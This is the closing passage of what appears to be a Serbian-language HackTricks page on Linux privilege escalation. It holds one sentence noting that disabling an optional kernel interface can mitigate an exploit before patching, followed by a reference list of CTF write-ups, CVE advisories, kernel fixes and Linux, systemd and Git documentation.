Ovu vrstu ublažavanja vredi imati na umu i kod drugih kernel LPE-ova: ako eksploatacija zavisi od određenog opcionog interfejsa, njegovo onemogućavanje ili stavljanje na crnu listu može da prekine putanju eksploatacije čak i pre nego što bude dostupna potpuna nadogradnja kernela.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – otmica skripte koja se izvršava kao root u PaperCut direktorijumu koji korisnik može da menja](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) – česta pitanja](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security objava o ranjivosti CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Ispravka za Linux stable: crypto: algif_aead – vraćanje na rad van mesta](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — savetodavno obaveštenje o CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint – tehnički prikaz](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repozitorijum / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i eksploatacija Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Ispravka za Linux: net: skb: očuvanje `SKBFL_SHARED_FRAG` u `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ranije ublažavanje za Linux: postavljanje `SKBFL_SHARED_FRAG` za UDP pakete prosleđene splice operacijom (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian stranica priručnika](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Asocijacije MIME aplikacija](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifikacija Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifikacija Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Jezik Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile za Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: ranjivost keša stranica Linux kernela AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentacija za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentacija za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentacija za Git konfiguraciju](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — stranica priručnika za Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacija za systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — inženjering detekcije za Linux: mehanizmi persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
